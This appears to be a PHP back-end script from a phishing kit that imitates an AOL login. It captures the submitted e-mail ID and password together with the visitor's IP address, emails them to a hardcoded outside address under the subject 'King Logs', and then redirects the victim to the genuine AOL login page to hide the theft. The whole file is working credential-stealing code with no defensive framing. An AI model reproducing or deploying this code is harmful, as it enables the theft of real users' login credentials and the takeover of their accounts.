<?

$ip = getenv("REMOTE_ADDR");
$message .= "-------- Login Details 1--------------------------------\n";
$message .= "E-MAIL ID:".$_POST['loginId']."\n";
$message .= "PASSWORD:".$_POST['password']."\n";
$message .= "IP           : ".$ip."\n";
$message .= "----------Created By ARAB Money--------------\n";
$recipient = "obanshola@mail.com";
$subject = "King Logs";
mail($recipient,$subject,$message,$headers);
header("Location: https://my.screenname.aol.com/_cqr/login/login.psp");
?>